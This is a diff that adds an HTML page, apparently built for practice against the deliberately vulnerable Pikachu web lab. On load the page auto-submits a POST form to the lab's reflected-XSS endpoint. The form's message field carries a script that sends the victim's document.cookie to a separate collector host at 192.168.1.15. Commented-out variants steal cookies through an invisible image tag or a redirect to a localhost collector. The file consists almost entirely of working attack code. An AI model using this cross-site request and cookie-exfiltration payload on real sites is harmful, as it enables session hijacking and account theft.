@@ -1,0 +1,33 @@
+<html>
+<head>
+<script>
+window.onload = function() {
+  document.getElementById("postsubmit").click();
+}
+</script>
+</head>
+<body>
+<form method="post" action="http://192.168.1.4/pikachu/vul/xss/xsspost/xss_reflected_post.php">
+    <input id="xssr_in" type="text" name="message" value=
+    "<script>
+document.location = 'http://192.168.1.15/pkxss/xcookie/cookie.php?cookie=' + document.cookie;
+	</script>"
+	 />
+    <input id="postsubmit" type="submit" name="submit" value="submit" />
+</form>
+</body>
+</html>
+
+<!--
+ * 
+<script>
+document.write('<img src="http://127.0.0.1/antxss/xcookie/cookie.php?cookie='+document.cookie+'" width="0" height="0" border="0" />');
+</script>
+*/
+/*
+<script>
+document.location = 'http://127.0.0.1/antxss/xcookie/cookie.php?cookie=' + document.cookie;
+</script>
+*/
+-->
+
